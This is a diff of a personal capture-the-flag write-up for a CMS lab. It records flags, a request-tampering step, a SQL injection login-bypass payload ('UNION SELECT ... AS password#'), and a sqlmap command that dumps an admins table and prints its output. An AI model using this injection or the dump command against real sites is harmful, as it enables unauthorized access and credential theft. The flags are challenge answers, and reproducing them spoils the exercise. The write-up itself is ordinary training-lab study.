@@ -1,4 +1,4 @@
-**Analysis:**
+**Analysis:** 
 
 Has an updated message about fixing security flaws with the last CMS room.
 
@@ -28,11 +28,60 @@ I find the password using owaspzap:
 **Password:** leandro
 
 Flag1:
+
 `^FLAG^365711bf239e3112a9a624e33f8067d53584347a16ebb04f91ed917a25ac87e2$FLAG$`
 
+- While trying to edit the page the app will redirect back to the first flag when i enter the SQL user/pass.
+- I try manually editing the request in burp to try and access the edit page.
+
+**Vulnerable request:**
+
+`POST /page/edit/1 HTTP/2`
+
+**Flag2:**
+
+`^FLAG^c71c1119b382b4f980d44f784dd65032b611f7320520e70edce1470e35dea11e$FLAG$`
+
+![[Pasted image 20240907045651.png]]
+
+**Bypass login:**
+
+User:
+```php
+' UNION SELECT '123' AS password#
+```
+
+`SELECT password FROM admins WHERE username='admin' UNION SELECT '123' AS password#`
+
+Pass:
+```php
+123
+```
+
+**Flag3:**
+
+`^FLAG^ee822791773d6ecd8864420c02e2d9801ee0cc813911828960392116c49f93d7$FLAG$`
 
 
+![[Pasted image 20240907054315.png]]
 
+---
 
+**Completed:** _05:43 2024-09-07_
+
+_Extra_
+Finding the username, for the password we found earlier, with sqlmap.
+
+```php
+sqlmap -r req.txt -D level2 -T admins --dump
+```
+
+```php
++----+----------+----------+
+| id | password | username |
++----+----------+----------+
+| 1  | leandro  | patria   |
++----+----------+----------+
+```
 
 
